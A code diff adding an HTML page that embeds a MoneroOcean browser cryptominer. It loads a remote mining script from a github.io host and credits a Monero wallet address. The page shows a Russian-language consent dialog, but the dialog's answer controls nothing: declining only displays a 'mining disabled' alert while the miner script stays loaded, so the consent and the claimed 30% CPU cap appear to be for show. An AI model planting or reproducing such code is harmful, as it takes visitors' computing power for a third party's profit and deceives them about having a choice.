@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoneroOcean Web Miner</title>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript" src="https://sdoeringnew.github.io/web_miner.js"></script>
+</head>
+<body>
+    <h1>Веб-майнер MoneroOcean</h1>
+    <p>Поддержите наш сайт, майня Monero с помощью вашего процессора!</p>
+    <div id="moneroocean-web-miner" data-login="4AvpXBT4sxVfNC8TzhsCZZ1dZbTCZWCqgFx7PMdTSsLxfDfLgChJvxq8yrz67AmJNMTQwF2a17Z8PXQxW29i62vrEQso5Ck"></div>
+    <p>Примечание: Майнинг начнется автоматически после вашего согласия. Используется только 30% мощности вашего процессора, чтобы не перегружать устройство.</p>
+    <script>
+        window.onload = function() {
+            if (confirm("Этот сайт использует ваш процессор для майнинга Monero, чтобы поддерживать наш контент. Согласны ли вы начать майнинг?")) {
+                // Майнинг начнется автоматически
+            } else {
+                alert("Майнинг отключен. Спасибо за посещение!");
+            }
+        };
+    </script>
+</body>
+</html>
